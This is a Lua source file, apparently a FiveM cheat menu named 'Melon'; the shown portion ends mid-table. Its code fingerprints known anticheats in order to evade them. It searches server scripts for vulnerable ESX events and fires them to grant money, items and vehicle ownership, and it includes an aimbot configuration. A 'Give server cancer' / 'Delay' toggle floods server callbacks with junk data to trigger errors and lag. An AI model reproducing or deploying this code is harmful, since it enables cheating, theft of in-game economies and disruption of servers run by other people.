local ESX = nil
local menudelay = 125
local HasInteractSound = false
local Toggles = {['Menu sounds'] = true}
local MenuXOffset, MenuYOffset = 0.1, 0.303
local peds = {}
local currentplayer = 0
local friends = {}
local spectating, currentlyspectating, cam = false, 0, nil
local spawnedprops = {}
local allplayers = {}
local vehicles = {}
local playerblips = {}
local interactsoundaudios = {'no sounds'}
local autodrivespeed = 50
local anticheatrunning = false
local aimbotfov = 0.25
local aimbotbone = 'body'
local weatherlocked, hourlocked = 'SUNNY', 0
local MenuTitle = 'Melon'
local menuvisible = false
local animations = {}
local servereventdelay = 0

local bones = {
    ['body'] = 0,
    ['head'] = 31086,
    ['pelvis'] = 11816,
    ['left foot'] = 14201,
    ['right foot'] = 52301,
    ['right calf'] = 36864,
    ['left calf'] = 63931,
}

local props = {
    ['ferris wheel'] = 'prop_ld_ferris_wheel',
    ['container'] = 'prop_container_05a',
    ['ufo'] = 'p_spinning_anus_s',
    ['gas tank'] = 'prop_gas_tank_01a',
    ['helicopter'] = 'p_crahsed_heli_s'
}

local debug = true
local print = function(...)
    if debug then
        print(('[^1%s^0] %s'):format(MenuTitle, ...))
    end
end

-- idk how good these are hope they work pride boys
local Anticheats = {
    {'client.lua', 'math.ldexp'},
    {'client.lua', "oldPrint('^2[NSAC] '..trash..'^0')"},
    {'io_anticheat.lua', "function IllIlllIllIlllIlllIlllIll(IllIlllIllIllIll) if (IllIlllIllIllIll==(((((919 + 636)-636)*3147)/3147)+919))"},
    {'jesus_on_water.js', "var machinetherapist_0x1480="},
    {'__resource.lua', 'nui/rote_jesus.wav'}
}

local Objects

local menucolours, rgbenabled = {255, 255, 255, 255}, true

local weapons = {"WEAPON_KNIFE","WEAPON_MINIGUN","WEAPON_KNUCKLE","WEAPON_NIGHTSTICK","WEAPON_HAMMER","WEAPON_BAT","WEAPON_GOLFCLUB","WEAPON_CROWBAR","WEAPON_BOTTLE","WEAPON_DAGGER","WEAPON_HATCHET","WEAPON_MACHETE","WEAPON_FLASHLIGHT","WEAPON_SWITCHBLADE","WEAPON_PISTOL","WEAPON_COMBATPISTOL","WEAPON_APPISTOL","WEAPON_PISTOL50","WEAPON_SNSPISTOL","WEAPON_HEAVYPISTOL","WEAPON_VINTAGEPISTOL","WEAPON_STUNGUN","WEAPON_FLAREGUN","WEAPON_MARKSMANPISTOL","WEAPON_REVOLVER","WEAPON_MICROSMG","WEAPON_SMG","WEAPON_SMG_MK2","WEAPON_ASSAULTSMG","WEAPON_MG","WEAPON_COMBATMG","WEAPON_COMBATMG_MK2","WEAPON_COMBATPDW","WEAPON_GUSENBERG","WEAPON_MACHINEPISTOL","WEAPON_ASSAULTRIFLE","WEAPON_ASSAULTRIFLE_MK2","WEAPON_CARBINERIFLE","WEAPON_CARBINERIFLE_MK2","WEAPON_ADVANCEDRIFLE","WEAPON_SPECIALCARBINE","WEAPON_BULLPUPRIFLE","WEAPON_COMPACTRIFLE","WEAPON_PUMPSHOTGUN","WEAPON_SAWNOFFSHOTGUN","WEAPON_BULLPUPSHOTGUN","WEAPON_ASSAULTSHOTGUN","WEAPON_MUSKET","WEAPON_HEAVYSHOTGUN","WEAPON_DBSHOTGUN","WEAPON_SNIPERRIFLE","WEAPON_HEAVYSNIPER","WEAPON_HEAVYSNIPER_MK2","WEAPON_MARKSMANRIFLE","WEAPON_GRENADELAUNCHER","WEAPON_GRENADELAUNCHER_SMOKE","WEAPON_RPG","WEAPON_STINGER","WEAPON_FIREWORK","WEAPON_HOMINGLAUNCHER","WEAPON_GRENADE","WEAPON_STICKYBOMB","WEAPON_PROXMINE","WEAPON_BZGAS","WEAPON_SMOKEGRENADE","WEAPON_MOLOTOV","WEAPON_FIREEXTINGUISHER","WEAPON_PETROLCAN","WEAPON_SNOWBALL","WEAPON_FLARE","WEAPON_BALL"}

local Outfits = {
    ['troll 1'] = json.decode('{"sun_1":0,"eyebrows_2":10,"bodyb_1":0,"age_1":0,"makeup_4":0,"bags_1":0,"skin":2,"pants_2":0,"blush_2":0,"complexion_2":0,"tshirt_2":0,"chest_3":0,"beard_4":0,"sun_2":0,"lipstick_4":0,"shoes_1":34,"mask_2":12,"chest_2":0,"makeup_1":0,"shoes_2":0,"torso_2":0,"arms":15,"watches_1":-1,"lipstick_3":0,"helmet_2":0,"decals_2":0,"ears_1":-1,"eyebrows_4":0,"sex":0,"beard_3":0,"helmet_1":-1,"moles_1":0,"chain_1":0,"bags_2":0,"pants_1":21,"face":0,"chest_1":0,"eye_color":0,"chain_2":0,"lipstick_1":0,"arms_2":0,"eyebrows_3":0,"beard_2":10,"beard_1":10,"ears_2":0,"makeup_3":0,"blush_1":0,"glasses_1":0,"blemishes_2":0,"hair_1":0,"mask_1":49,"decals_1":0,"blush_3":0,"bracelets_1":-1,"bproof_1":0,"bodyb_2":0,"moles_2":0,"hair_2":0,"tshirt_1":15,"lipstick_2":0,"torso_1":15,"hair_color_1":0,"glasses_2":0,"bracelets_2":0,"bproof_2":0,"eyebrows_1":27,"age_2":0,"blemishes_1":0,"hair_color_2":0,"watches_2":0,"makeup_2":0,"complexion_1":0}'),
    ['troll 2'] = json.decode('{"chest_1":0,"arms":0,"bracelets_1":-1,"chest_2":0,"chain_1":0,"lipstick_3":0,"decals_2":0,"age_1":0,"face":7,"blush_2":0,"shoes_1":1,"bodyb_1":0,"blush_3":0,"blush_1":0,"hair_1":7,"hair_color_2":0,"ears_2":0,"lipstick_1":0,"beard_3":0,"complexion_2":0,"chain_2":0,"sex":0,"eyebrows_2":10,"pants_1":6,"bracelets_2":0,"blemishes_2":0,"decals_1":0,"torso_2":0,"chest_3":0,"mask_2":0,"helmet_2":0,"bodyb_2":0,"makeup_2":0,"eyebrows_4":0,"hair_color_1":11,"age_2":0,"eye_color":0,"eyebrows_3":0,"bags_2":0,"beard_1":10,"makeup_1":0,"moles_1":0,"beard_2":10,"watches_2":0,"watches_1":-1,"makeup_3":0,"shoes_2":0,"helmet_1":-1,"sun_1":0,"beard_4":0,"moles_2":0,"skin":2,"glasses_1":0,"bproof_1":0,"lipstick_4":0,"makeup_4":0,"complexion_1":0,"blemishes_1":0,"sun_2":0,"glasses_2":0,"bproof_2":0,"ears_1":-1,"torso_1":0,"pants_2":0,"mask_1":0,"eyebrows_1":27,"hair_2":0,"tshirt_2":0,"tshirt_1":0,"bags_1":0,"arms_2":0,"lipstick_2":0}'),
    ['troll 3'] = json.decode('{"blush_1":0,"lipstick_1":0,"shoes_2":0,"torso_1":15,"face":24,"moles_1":0,"mask_1":49,"chain_1":0,"hair_color_2":0,"eye_color":0,"arms_2":0,"bodyb_2":0,"hair_color_1":0,"tshirt_2":0,"watches_2":0,"bproof_2":0,"mask_2":7,"makeup_1":0,"chest_3":0,"makeup_3":0,"shoes_1":34,"age_2":0,"beard_4":0,"lipstick_3":0,"complexion_1":0,"beard_1":10,"chest_1":0,"makeup_4":0,"chest_2":0,"bracelets_1":-1,"skin":5,"blemishes_2":0,"decals_2":0,"hair_2":0,"bproof_1":0,"pants_2":4,"age_1":0,"decals_1":0,"blush_2":0,"ears_1":-1,"blemishes_1":0,"chain_2":0,"glasses_1":0,"bodyb_1":0,"sun_2":0,"bracelets_2":0,"blush_3":0,"helmet_2":0,"moles_2":0,"torso_2":0,"sun_1":0,"sex":0,"complexion_2":0,"watches_1":-1,"eyebrows_4":0,"eyebrows_2":10,"beard_3":0,"beard_2":10,"arms":5,"eyebrows_3":0,"bags_1":0,"pants_1":56,"lipstick_2":0,"hair_1":0,"lipstick_4":0,"tshirt_1":131,"makeup_2":0,"bags_2":0,"glasses_2":0,"ears_2":0,"helmet_1":-1,"eyebrows_1":0}'),
    ['troll 4'] = json.decode('{"eyebrows_4":0,"lipstick_1":0,"shoes_2":9,"torso_1":2,"face":0,"moles_1":0,"mask_1":0,"chain_1":0,"hair_color_2":0,"hair_1":51,"eyebrows_3":0,"bodyb_2":0,"hair_color_1":2,"tshirt_2":1,"watches_2":0,"chain_2":0,"mask_2":0,"makeup_1":0,"chest_3":0,"makeup_3":0,"shoes_1":57,"bodyb_1":0,"beard_4":0,"lipstick_3":0,"complexion_1":0,"beard_1":10,"arms":43,"makeup_4":0,"chest_2":0,"bracelets_1":-1,"skin":8,"blemishes_2":0,"decals_2":0,"hair_2":0,"bproof_1":0,"pants_2":11,"age_1":0,"decals_1":0,"blush_2":0,"ears_1":-1,"complexion_2":0,"helmet_2":0,"glasses_1":0,"blush_1":0,"sun_2":0,"blush_3":0,"arms_2":0,"bproof_2":0,"moles_2":0,"torso_2":9,"sun_1":0,"chest_1":0,"bags_1":0,"watches_1":-1,"eyebrows_2":10,"lipstick_2":0,"beard_3":0,"blemishes_1":0,"sex":0,"age_2":0,"eye_color":3,"pants_1":2,"beard_2":10,"bracelets_2":0,"lipstick_4":0,"tshirt_1":59,"makeup_2":0,"bags_2":0,"glasses_2":0,"ears_2":0,"helmet_1":-1,"eyebrows_1":12}'),
    ['troll 5'] = json.decode('{"eyebrows_1":0,"mask_1":0,"moles_1":0,"complexion_1":0,"hair_color_1":0,"bproof_1":16,"glasses_2":0,"bracelets_2":0,"sex":0,"lipstick_1":0,"hair_color_2":0,"bproof_2":1,"arms":15,"bodyb_1":0,"shoes_2":0,"decals_2":0,"age_2":0,"bodyb_2":0,"helmet_1":-1,"face":24,"makeup_2":0,"lipstick_3":0,"ears_2":0,"beard_3":0,"blemishes_2":0,"makeup_1":0,"mask_2":0,"chain_2":0,"ears_1":-1,"tshirt_1":15,"blemishes_1":0,"pants_1":16,"beard_4":0,"hair_2":0,"blush_2":0,"chest_3":0,"sun_1":0,"eye_color":0,"lipstick_4":0,"lipstick_2":0,"arms_2":0,"eyebrows_3":0,"moles_2":0,"torso_1":15,"eyebrows_2":0,"complexion_2":0,"bracelets_1":-1,"blush_1":0,"sun_2":0,"watches_2":0,"makeup_4":0,"pants_2":6,"bags_2":0,"blush_3":0,"chest_2":10,"watches_1":-1,"chain_1":0,"torso_2":0,"beard_1":22,"glasses_1":16,"makeup_3":0,"skin":0,"helmet_2":0,"chest_1":0,"hair_1":16,"beard_2":10,"age_1":0,"shoes_1":0,"decals_1":0,"eyebrows_4":0,"tshirt_2":0,"bags_1":0}'),
    ['Legit 1'] = json.decode('{"torso_1":13,"shoes_2":2,"shoes_1":8,"chest_1":4,"eyebrows_3":0,"bags_2":0,"beard_3":0,"chest_3":5,"makeup_1":0,"helmet_1":-1,"decals_2":0,"blush_3":0,"mask_2":0,"ears_1":3,"moles_2":0,"moles_1":0,"chain_1":11,"watches_1":4,"age_1":7,"bodyb_1":2,"bproof_2":0,"blush_2":0,"eyebrows_4":0,"mask_1":0,"eyebrows_2":10,"tshirt_1":20,"bracelets_2":0,"blush_1":6,"lipstick_4":0,"arms_2":0,"glasses_2":0,"bags_1":0,"lipstick_2":0,"eyebrows_1":0,"sun_2":5,"lipstick_1":0,"lipstick_3":0,"blemishes_1":0,"pants_1":7,"chain_2":2,"skin":4,"hair_1":46,"age_2":0,"sex":0,"bodyb_2":2,"bracelets_1":0,"blemishes_2":0,"makeup_3":0,"eye_color":3,"face":0,"glasses_1":5,"hair_color_2":0,"beard_1":7,"makeup_2":0,"beard_4":0,"arms":0,"decals_1":0,"pants_2":0,"chest_2":3,"torso_2":0,"complexion_2":3,"hair_2":0,"bproof_1":0,"ears_2":2,"beard_2":9,"tshirt_2":0,"helmet_2":0,"complexion_1":9,"makeup_4":0,"hair_color_1":4,"sun_1":9,"watches_2":0}'),
    ['Legit 2'] = json.decode('{"eyebrows_2":0,"beard_4":0,"chest_1":0,"complexion_1":0,"blush_1":0,"glasses_1":2,"mask_1":0,"bags_1":0,"ears_1":-1,"decals_2":0,"tshirt_1":5,"blush_2":0,"complexion_2":0,"lipstick_4":0,"shoes_2":0,"hair_color_1":1,"bproof_1":0,"decals_1":0,"moles_1":0,"beard_3":20,"blemishes_2":0,"bags_2":0,"pants_1":23,"eye_color":0,"chain_2":0,"bodyb_2":0,"bracelets_2":0,"sun_1":0,"moles_2":0,"blush_3":0,"hair_color_2":0,"helmet_2":0,"lipstick_3":0,"hair_2":0,"torso_1":253,"shoes_1":25,"hair_1":19,"glasses_2":0,"eyebrows_3":0,"face":0,"age_1":0,"skin":0,"beard_2":8,"ears_2":0,"age_2":0,"bodyb_1":0,"arms":0,"torso_2":0,"chain_1":0,"tshirt_2":0,"bproof_2":0,"makeup_4":0,"chest_3":0,"makeup_3":0,"mask_2":0,"bracelets_1":-1,"makeup_1":0,"pants_2":1,"lipstick_2":0,"eyebrows_1":0,"chest_2":0,"lipstick_1":0,"eyebrows_4":0,"watches_2":0,"watches_1":-1,"blemishes_1":0,"arms_2":0,"sex":0,"helmet_1":-1,"makeup_2":0,"beard_1":11,"sun_2":0}'),
    ['Legit 3'] = json.decode('{"watches_1":14,"pants_2":0,"bproof_1":0,"ears_1":-1,"mask_1":0,"age_2":0,"bags_1":0,"bproof_2":0,"makeup_4":0,"lipstick_4":0,"bracelets_2":0,"mask_2":0,"beard_3":0,"torso_1":190,"eyebrows_4":0,"eyebrows_2":9,"tshirt_1":15,"decals_2":0,"makeup_1":0,"chain_1":0,"ears_2":0,"eyebrows_3":0,"chest_1":0,"sun_2":0,"beard_1":0,"blemishes_1":0,"complexion_1":0,"blush_1":0,"glasses_2":1,"makeup_2":0,"decals_1":0,"sex":0,"hair_1":19,"complexion_2":0,"glasses_1":5,"chest_2":0,"bodyb_2":0,"hair_color_2":0,"bracelets_1":-1,"chest_3":0,"bodyb_1":0,"pants_1":78,"beard_4":0,"tshirt_2":0,"moles_1":0,"shoes_2":1,"watches_2":0,"eyebrows_1":0,"blush_2":0,"arms":0,"bags_2":0,"lipstick_3":0,"moles_2":0,"makeup_3":0,"helmet_2":0,"lipstick_2":0,"hair_color_1":1,"eye_color":0,"arms_2":0,"helmet_1":-1,"hair_2":1,"beard_2":0,"blush_3":0,"lipstick_1":0,"blemishes_2":0,"skin":4,"age_1":0,"torso_2":0,"sun_1":0,"face":0,"shoes_1":75,"chain_2":0}'),
    ['Legit 4'] = json.decode('{"lipstick_4":0,"shoes_2":0,"ears_2":0,"eye_color":0,"decals_1":0,"sun_1":0,"chain_1":28,"skin":4,"sun_2":0,"hair_color_2":29,"bproof_1":0,"eyebrows_4":0,"complexion_1":0,"beard_4":0,"beard_2":0,"torso_2":0,"glasses_1":17,"helmet_1":-1,"chest_2":0,"torso_1":29,"mask_2":0,"decals_2":0,"arms_2":0,"tshirt_2":0,"tshirt_1":31,"moles_1":0,"arms":17,"mask_1":0,"hair_color_1":29,"bodyb_2":0,"eyebrows_3":28,"sex":0,"ears_1":-1,"beard_1":0,"eyebrows_1":17,"lipstick_2":0,"pants_1":28,"watches_1":-1,"hair_2":4,"blush_2":0,"blush_1":0,"helmet_2":0,"bodyb_1":0,"beard_3":0,"shoes_1":10,"makeup_2":0,"bags_2":0,"bracelets_2":0,"glasses_2":9,"age_1":14,"blemishes_2":0,"makeup_1":0,"bracelets_1":-1,"lipstick_3":0,"face":1,"lipstick_1":0,"age_2":10,"makeup_3":0,"pants_2":0,"complexion_2":0,"blush_3":0,"hair_1":18,"chain_2":2,"blemishes_1":0,"bags_1":0,"chest_1":0,"makeup_4":0,"moles_2":0,"watches_2":0,"chest_3":0,"bproof_2":0,"eyebrows_2":10}'),
}

local KeyboardInput = function(TextEntry, ExampleText, MaxStringLenght)

    AddTextEntry('FMMC_KEY_TIP1', TextEntry)
    DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", ExampleText, "", "", "", MaxStringLenght)
    while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
        Wait(0)
    end
        
    if UpdateOnscreenKeyboard() ~= 2 then
        local result = GetOnscreenKeyboardResult()
        Wait(500)
        return result
    else
        Wait(500)
        return false 
    end
end

local RGB = function(speed, ismenu)
    local res = {}

    for k, v in pairs({0, 2, 4}) do
        local Time = GetGameTimer() / 200
        table.insert(res, math.floor(math.sin(Time * (speed or 0.2) + v) * 127 + 128))
    end

    table.insert(res, 255)

    if rgbenabled or not ismenu then
        return res
    else
        return menucolours
    end
end

local DrawTxt = function(text, top, usergb, colour, scale, customleft, centre, rgbspeed, customfont)
    if usergb then
        SetTextColour(table.unpack(RGB(rgbspeed or 0.7, true)))
    else
        local r, g, b = table.unpack(colour or {125, 125, 125})
        SetTextColour(r, g, b, 255)
    end
    SetTextFont(customfont or 0)
    SetTextScale(scale or 0.3, scale or 0.3)
    if centre then
        SetTextCentre(true)
    end
    SetTextCentre(false)
    SetTextEdge(1, 0, 0, 0, 205)
    SetTextEntry("STRING")
    AddTextComponentString(text)
    DrawText(customleft or MenuXOffset - 0.082, top)
end

local Alert = function(txt)
    CreateThread(function()
        local timer = GetGameTimer() + 1500
        while timer >= GetGameTimer() do
            Wait(0)
            DrawTxt(txt, 0.3, false, {255, 0, 0}, 0.5, 0.5, true, 0.1)
        end
    end)
end

local AnticheatWarning = function()
    CreateThread(function()
        local timer = GetGameTimer() + 1500
        while timer >= GetGameTimer() do
            Wait(0)
            DrawTxt('This server is probably using an anticheat. This action has been blocked.', 0.3, false, {255, 0, 0}, 0.5, 0.5, true, 0.1)
        end
    end)
end

local types = {
    ['Object'] = {
        FindFirstObject,
        FindNextObject,
        EndFindObject
    },
    ['Ped'] = {
        FindFirstPed,
        FindNextPed,
        EndFindPed
    },
    ['Vehicle'] = {
        FindFirstVehicle,
        FindNextVehicle,
        EndFindVehicle
    }
}

local GetBoneAimingAt = function(pped)
    local closestbone, closestdist = 10000.0, 10000.0
    for k, v in pairs(bones) do
        local onscreen, x, y = GetScreenCoordFromWorldCoord(table.unpack(GetPedBoneCoords(pped, v, 0, 0, 0)))
        local dist = math.abs(0.5 - x) + math.abs(0.5 - y)
        if dist < closestdist then
            closestdist = dist
            closestbone = v 
        end
    end

    return closestbone
end

local emptyfunc = function()
end

local GetStuff = function(type)
    local data = {}
    local funcs = types[type]
    local handle, ent, success = funcs[1]()

    repeat
        success, entity = funcs[2](handle)
        if DoesEntityExist(entity) then
            table.insert(data, entity)
        end
    until not success

    funcs[3](handle)
    return data
end

local ShootAtCoord = function(coords)
    if type(coords) == 'vector3' then
        if coords['x'] and coords['y'] and coords['z'] then
            if IsPedArmed(PlayerPedId(), 4) then
                if IsPedWeaponReadyToShoot(PlayerPedId()) then
                    SetPedShootsAtCoord(PlayerPedId(), coords, true)
                end
            end
        end
    end
end

local ESXMenu = function(data)
    if ESX then
        if data['Type'] == 'toggle' then
            Toggles[data['Text']] = data['Enabled']
        elseif data['Type'] == 'button' then
            if data['Text'] == 'Set current vehicle as owned' then
                local methods = {
                    ['qalle'] = {
                        ['Text'] = 'ESX.TriggerServerCallback("esx-qalle-sellvehicles:buyVehicle"',
                        ['Location'] = 'client/main.lua',
                    },
                    ['vehicleshopold'] = {
                        ['Text'] = "TriggerServerEvent('esx_vehicleshop:setVehicleOwned', vehicleProps)",
                        ['Location'] = 'client/main.lua'
                    }
                }
                local usemethod = false

                if not usemethod then
                    for k, v in pairs(methods) do
                        for i = 0, GetNumResources() - 1 do
                            if GetResourceState(GetResourceByFindIndex(i)) == 'started' then
                                local text = LoadResourceFile(GetResourceByFindIndex(i), v['Location'])
                                if text then
                                    if string.find((text):lower(), v['Text']:lower(), 1, true) then
                                        print('Vehicle method: ^1' .. k)
                                        usemethod = k
                                    end
                                end
                            end
                        end
                    end
                end

                local veh = GetVehiclePedIsUsing(PlayerPedId())
                if veh then
                    if DoesEntityExist(veh) then
                        if usemethod == 'qalle' then
                            ESX['TriggerServerCallback']('esx-qalle-sellvehicles:buyVehicle', function(success)
                                if success then
                                    Alert('Set vehicle as owned.')
                                    print('BOUGHT IT LOL')
                                else
                                    Alert('Couldn\'t set vehicle as owned.')
                                    print('Couldn\'t buy it :/')
                                end
                            end, ESX['Game']['GetVehicleProperties'](veh), 0)
                        elseif usemethod == 'vehicleshopold' then
                            TriggerServerEvent('esx_vehicleshop:setVehicleOwned', ESX['Game']['GetVehicleProperties'](veh))
                        else
                            Alert('Couldn\'t find a method to set vehicle as owned.')
                        end
                    else
                        Alert('You are not sitting in a vehicle.')
                    end
                else
                    Alert('You are not sitting in a vehicle.')
                end
            elseif data['Text'] == 'Update current vehicle information' then
                local methods = {
                    ['lscustoms'] = {
                        ['Text'] = "TriggerServerEvent('esx_lscustom:refreshOwnedVehicle', myCar)",
                        ['Location'] = 'client/main.lua',
                    },
                }
                local usemethod = false

                if not usemethod then
                    for k, v in pairs(methods) do
                        for i = 0, GetNumResources() - 1 do
                            if GetResourceState(GetResourceByFindIndex(i)) == 'started' then
                                local text = LoadResourceFile(GetResourceByFindIndex(i), v['Location'])
                                if text then
                                    if string.find((text):lower(), v['Text']:lower(), 1, true) then
                                        print('Vehicle method: ^1' .. k)
                                        usemethod = k
                                    end
                                end
                            end
                        end
                    end
                end

                local veh = GetVehiclePedIsUsing(PlayerPedId())
                if veh then
                    if DoesEntityExist(veh) then
                        if usemethod == 'lscustoms' then
                            TriggerServerEvent('esx_lscustom:refreshOwnedVehicle', ESX['Game']['GetVehicleProperties'](veh))
                        else
                            Alert('Couldn\'t find a method to update vehicle cosmetics & performance.')
                        end
                    else
                        Alert('You are not sitting in a vehicle.')
                    end
                else
                    Alert('You are not sitting in a vehicle.')
                end
            elseif data['Text'] == 'Max thirst & hunger' then
                TriggerEvent('esx_status:set', 'hunger', 1000000)
	            TriggerEvent('esx_status:set', 'thirst', 1000000)
            elseif data['Text'] == 'Get item' then
                local itemmethods = {
                    ['99kr'] = {
                        ['Text'] = 'shops:Cashier',
                        ['Location'] = 'client/shop.lua',
                    },
                    ['99kr_burglary'] = {
                        ['Text'] = "TriggerServerEvent('99kr-burglary:Add'",
                        ['Location'] = 'burglary_client.lua'
                    }
                }
                local usemethod = false
                
                if not usemethod then
                    for k, v in pairs(itemmethods) do
                        for i = 0, GetNumResources() - 1 do
                            if GetResourceState(GetResourceByFindIndex(i)) == 'started' then
                                local text = LoadResourceFile(GetResourceByFindIndex(i), v['Location'])
                                if text then
                                    if string.find((text):lower(), v['Text']:lower(), 1, true) then
                                        print('Item method: ^1' .. k)
                                        usemethod = k
                                    end
                                end
                            end
                        end
                    end
                end

                if usemethod then
                    local item = KeyboardInput('What item do you want?', '', 30)
                    if item then
                        local amount = KeyboardInput(('How many "%s" do you want to spawn?'):format(item), '', 30)
                        if tonumber(amount) then
                            if usemethod == '99kr' then
                                TriggerServerEvent('99kr-shops:Cashier', 0, {
                                    {
                                        ['value'] = item,
                                        ['amount'] = tonumber(amount)
                                    }
                                }, 'cash')
                            elseif usemethod == '99kr_burglary' then
                                TriggerServerEvent('99kr-burglary:Add', item, amount)
                            end
                        end
                    end
                else
                    CreateThread(function()
                        local timer = GetGameTimer() + 1500
                        while timer >= GetGameTimer() do
                            Wait(0)
                            DrawTxt('Couldn\'t find a method to spawn item.', 0.3, false, {255, 0, 0}, 0.5, 0.5, true, 0.1)
                        end
                    end)
                end
            end
        elseif data['Text'] == 'Cuff / uncuff (self)' then
            TriggerEvent('esx_policejob:handcuff')
        end
    else
        print('ESX is not loaded...')
    end
end

local moneymethods = {
    {
        ['Text'] = 'esx_vangelico_robbery:gioielli',
        ['Location'] = 'client/esx_vangelico_robbery_cl.lua',
        ['Method'] = {
            ['Events'] = {
                {'server', 'esx_vangelico_robbery:gioielli'},
                {'server', 'esx_vangelico_robbery:gioielli1'},
                {'server', 'lester:vendita'}
            },
        },
    },
    {
        ['Text'] = "TriggerServerEvent('esx-qalle-hunting:reward', AnimalWeight)",
        ['Location'] = 'client/main.lua',
        ['Method'] = {
            ['Events'] = {
                {'server', 'esx-qalle-hunting:reward', 18},
                {'server', 'esx-qalle-hunting:sell'}
            },
        },
    },
    {
        ['Text'] = 'TriggerServerEvent("esx-ecobottles:retrieveBottle")',
        ['Location'] = 'client/main.lua',
        ['Method'] = {
            ['Events'] = {
                {'server', 'esx-ecobottles:retrieveBottle'},
                {'server', 'esx-ecobottles:sellBottles'}
            },
        },
    },
    {
        ['Text'] = "TriggerServerEvent('esx_carthief:pay', finalpayment)",
        ['Location'] = 'client/main.lua',
        ['Method'] = {
            ['Events'] = {
                {'server', 'esx_carthief:pay', 1500},
            },
        },
    },
    {
        ['Text'] = "TriggerServerEvent('loffe_carthief:questFinished')",
        ['Location'] = 'client.lua',
        ['Method'] = {
            ['Events'] = {
                {'server', 'loffe_carthief:questFinished'},
            },
        },
    },
    {
        ['Text'] = "TriggerServerEvent('loffe_fishing:caught')",
        ['Location'] = 'client.lua',
        ['Method'] = {
            ['Events'] = {
                {'server', 'loffe_fishing:caught'},
                {'server', 'loffe_fishing:sell'},
            },
        },
    },
    {
        ['Text'] = "TriggerServerEvent('esx_loffe_fangelse:Pay')",
        ['Location'] = 'client/main.lua',
        ['Method'] = {
            ['Events'] = {
                {'server', 'esx_loffe_fangelse:Pay'},
            },
        },
    },
    {
        ['Text'] = "TriggerServerEvent('loffe_robbery:pickUp', i)",
        ['Location'] = 'client.lua',
        ['Method'] = {
            ['Events'] = {
                {'server', 'loffe_robbery:pickUp', 1},
            },
        },
    },
    {
        ['Text'] = 'TriggerServerEvent("esx_truckerjob:pay", amount)',
        ['Location'] = 'client/main.lua',
        ['Method'] = {
            ['Events'] = {
                {'server', 'esx_truckerjob:pay', 1500},
            },
        },
    }
}
local usemethod = {}

local ESXMoney = function()
    if #usemethod == 0 then
        for i = 0, GetNumResources() - 1 do
            for k, v in pairs(moneymethods) do
                if GetResourceState(GetResourceByFindIndex(i)) == 'started' then
                    local text = LoadResourceFile(GetResourceByFindIndex(i), v['Location'])
                    if text then
                        if string.find((text):lower(), v['Text']:lower(), 1, true) then
                            print('Event: ^1' .. v['Text'] .. ' ^0found')
                            usemethod[k] = v
                        end
                    end
                end
            end
        end
        Wait(3000) -- it's cpu heavy to search through a lot of scripts
        if #usemethod == 0 then
            print('no method found')
        end
    else
        for k, v in pairs(usemethod) do
            for k, v in pairs(v['Method']['Events']) do
                print('Triggering event: ^1' .. v[2])
                if v[1] == 'server' then
                    if v[3] then
                        TriggerServerEvent(v[2], v[3])
                    else
                        TriggerServerEvent(v[2])
                    end
                elseif v[1] == 'client' then
                    if v[3] then
                        TriggerEvent(v[2], v[3])
                    else
                        TriggerEvent(v[2])
                    end
                end
            end
            Wait(2500) -- bypass network overflow?
        end
        Wait(0)
    end
end

local ESXCode = function()
    local delay = GetGameTimer()
    while true do
        local sleep = 0
        if ESX then
            for k, v in pairs(Toggles) do
                if k == 'Delay' then
                    if v then
                        if delay <= GetGameTimer() then
                            local nearbylol = {}
                            for i = 1, 5000 do
                                table.insert(nearbylol, {plate = ('^0[^%s%s^0] ^%sLOL WHAT U GONNA DO ABOUT IT^0'):format(math.random(1,9), MenuTitle, math.random(1, 9))})
                            end

                            if GetResourceState('esx_ambulancejob') == 'started' then
                                TriggerServerEvent('esx_ambulancejob:setDeathStatus', false)
                                ESX['TriggerServerCallback']('esx_ambulancejob:getDeathStatus', emptyfunc)
                                ESX['TriggerServerCallback']('esx_ambulancejob:storeNearbyVehicle', emptyfunc, nearbylol)
                            end
                            if GetResourceState('esx_policejob') == 'started' then
                                ESX['TriggerServerCallback']('esx_policejob:storeNearbyVehicle', emptyfunc, nearbylol)
                            end
                            if GetResourceState('esx_skin') == 'started' then
                                ESX['TriggerServerCallback']('esx_skin:getPlayerSkin', emptyfunc)
                            end
                            if GetResourceState('esx_property') == 'started' then
                                TriggerServerEvent('esx_property:deleteLastProperty')
                                TriggerServerEvent('esx_property:saveLastProperty', 'nil')
                            end
                            TriggerServerEvent('esx:onPickup', 'lol') -- SCRIPT ERROR: @es_extended/server/main.lua:453: attempt to index a nil value (local 'pickup')
                            ESX['TriggerServerCallback'](('^0[^%s%s^0] ^%sLOL WHAT U GONNA DO ABOUT IT^0'):format(math.random(1,9), MenuTitle, math.random(1, 9)), emptyfunc) -- es_extended: TriggerServerCallback => [LOL WHAT U GONNA DO ABOUT IT] does not exist
                            delay = GetGameTimer() + 0
                            delay = GetGameTimer() + 2500
                        end
                    end
                elseif k == 'Get money' then
                    if v then
                        ESXMoney()
                    end
                elseif k == 'Give server cancer' then
                    if v then
                        TriggerServerEvent('esx:onPickup', 'lol') -- SCRIPT ERROR: @es_extended/server/main.lua:453: attempt to index a nil value (local 'pickup')
                        ESX['TriggerServerCallback'](('^0[^%s%s^0] ^%sLOL WHAT U GONNA DO ABOUT IT^0'):format(math.random(1,9), MenuTitle, math.random(1, 9)), emptyfunc) -- es_extended: TriggerServerCallback => [LOL WHAT U GONNA DO ABOUT IT] does not exist
                    end
                    Wait(1000)
                end
            end
        else
            sleep = 250
        end
        Wait(sleep)
    end
end

local ForceESX = function()
    CreateThread(function()
        while ESX == nil do 
            TriggerEvent('esx:getSharedObject', function(obj) 
                ESX = obj
                if obj then
                    print('ESX successfully loaded.')
                end
                Objects[11] = {
                    {
                        ['Text'] = 'Delay',
                        ['Type'] = 'toggle',
                        ['Enabled'] = false,
                        ['cb'] = ESXMenu
                    },
                    {
                        ['Text'] = 'Get money',
                        ['Type'] = 'toggle',
                        ['Enabled'] = false,
                        ['cb'] = ESXMenu
                    },
                    {
                        ['Text'] = 'Get item',
                        ['Type'] = 'button',
                        ['cb'] = ESXMenu
                    },
                    {
                        ['Text'] = 'Max thirst & hunger',
                        ['Type'] = 'button',
                        ['cb'] = ESXMenu
                    },
                    {
                        ['Text'] = 'Set current vehicle as owned',
                        ['Type'] = 'button',
                        ['cb'] = ESXMenu
                    },
                    {
                        ['Text'] = 'Update current vehicle information',
                        ['Type'] = 'button',
                        ['cb'] = ESXMenu
                    },
                    {
                        ['Text'] = 'Cuff / uncuff (self)',
                        ['Type'] = 'button',
                        ['cb'] = ESXMenu 
                    },
                    {
